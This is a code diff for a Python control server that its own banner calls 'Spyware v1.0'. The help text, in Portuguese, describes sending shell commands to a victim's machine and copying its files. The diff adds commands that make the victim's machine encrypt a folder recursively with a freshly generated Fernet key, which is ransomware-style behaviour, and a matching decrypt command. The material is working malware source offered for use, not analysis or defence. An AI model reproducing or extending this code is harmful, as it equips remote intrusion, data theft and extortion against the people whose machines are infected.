@@ -3,12 +3,13 @@ import selectors
 import sys
 import os
 import time
+from cryptography.fernet import Fernet
 
 _HOST = '192.168.100.165'
 _PORT = 9991
 _MAX_MSG_SIZE = 4096 # estava 8192
 
-_PORT = int(sys.argv[1])
+_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else _PORT
 
 
 
@@ -16,20 +17,21 @@ def help():
     os.system('cls||clear')
     print(
 '{}█████████████████████████████████████████████████████████████████████████████████████████████\n'
-  '██████████████████▀▀▀░░░░░░░▀▀▀█████████████████Spyware v1.0██████████████████████████████████\n'
-  '███████████████▀░░░░░░░░░░░░░░░░░▀████████████████████socket.py████████████████████████████████\n'
-  '██████████████│░░░░░░░░░░░░░░░░░░░│█████████████████████████████████████████████████████████████\n'
-  '█████████████▌│░░░░░░░░░░░░░░░░░░░│▐█████████████████████████████████████████████████████████████\n'
-  '█████████████░└┐░░░░░░░░░░░░░░░░░┌┘░██████/msg <Mensagem> -> Envia uma Mensagem███████████████████\n'
-  '█████████████░░└┐░░░░░░░░░░░░░░░┌┘░░███████████████████████████████████████████████████████████████\n'
-  '█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████/cmd <Comando>  -> Envia comandos a máquina██████████████\n'
-  '█████████████▌░│██████▌░░░▐██████│░▐██████da vitima OBS: Os comandos mudam conforme o██████████████\n'
-  '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████sistema operacional da vitima.███████████████████████████\n'
-  '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀███████████████████████████████semelhante a um ssh█████████████\n'
-  '█████████████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄███████████████████████████████primitivo...████████████████████\n'
+  '████████████████████████████████████████████████Spyware v1.0██████████████████████████████████\n'
+  '██████████████████▀▀▀░░░░░░░▀▀▀███████████████████████socket.py████████████████████████████████\n'
+  '███████████████▀░░░░░░░░░░░░░░░░░▀██████████████████████████████████████████████████████████████\n'
+  '██████████████│░░░░░░░░░░░░░░░░░░░│███████/msg <Mensagem> -> Envia uma Mensagem██████████████████\n'
+  '█████████████▌│░░░░░░░░░░░░░░░░░░░│▐██████████████████████████████████████████████████████████████\n'
+  '█████████████░└┐░░░░░░░░░░░░░░░░░┌┘░██████/cmd <Comando>  -> Envia comandos a máquina██████████████\n'
+  '█████████████░░└┐░░░░░░░░░░░░░░░┌┘░░██████da vitima OBS: Os comandos mudam conforme o██████████████\n'
+  '█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████sistema operacional da vitima.███████████████████████████\n'
+  '█████████████▌░│██████▌░░░▐██████│░▐██████semelhante a um ssh primitivo...█████████████████████████\n'
+  '██████████████░│▐███▀▀░░▄░░▀▀███▌│░████████████████████████████████████████████████████████████████\n'
+  '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████/cmd cpy <Nome do Arquivo> -> Copia o arquivo████████████\n'
+  '█████████████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██████da máquina da vitima para a sua.█████████████████████████\n'
   '███████████████▄─┘██▌░░░░░░░▐██└─▄█████████████████████████████████████████████████████████████████\n'
-  '████████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████/cmd cpy <Nome do Arquivo> -> Copia o arquivo████████████\n'
-  '███████████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████da máquina da vitima para a sua.████████████████████████\n'
+  '████████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████/cmd cryp <Caminho> -> Criptografa os arquivos███████████\n'
+  '███████████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████recursivamente usando a chave informada█████████████████\n'
   '████████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄████████████████████████████████████████████████████████████████\n'
   '██████████████████▄░░░░░░░░░░░▄███████████/help -> Exibe essa tela novamente.███████████████████\n'
   '█████████████████████▄▄▄▄▄▄▄███████████████████████████████████████████████████████████████████\n'
@@ -131,6 +133,18 @@ if __name__ == "__main__":
                             recv_files[0] = open(name_arq, 'wb')
                             recv_files[1] = None
                             print('{}Recebendo Arquivo...{}'.format(cores['red'], cores['yellow']))
+                        elif data[5:9] == 'cryp':
+                            encrypt_path = data[10:].strip()
+                            key = Fernet.generate_key().decode().strip()
+                            print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
+                                               .format(cores['red'], cores['yellow'], encrypt_path, cores['red'], cores['green'], key))
+                            conn.send(('cmdcryp' + encrypt_path + ':' + key).encode())
+                        elif data[5:10] == 'dcryp':
+                            decrypt_path = data[11:].strip()
+                            key = input('\n{}Digite a chave para descriptografar o caminho {}{}{} > {}{}'.format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], cores['yellow']))
+                            print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
+                                               .format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], key))
+                            conn.send(('cmddcryp' + decrypt_path + ':' + key).encode())
                         else:
                             # Se for comandos "normais"
                             conn.send(('cmd' + data[5:]).encode())
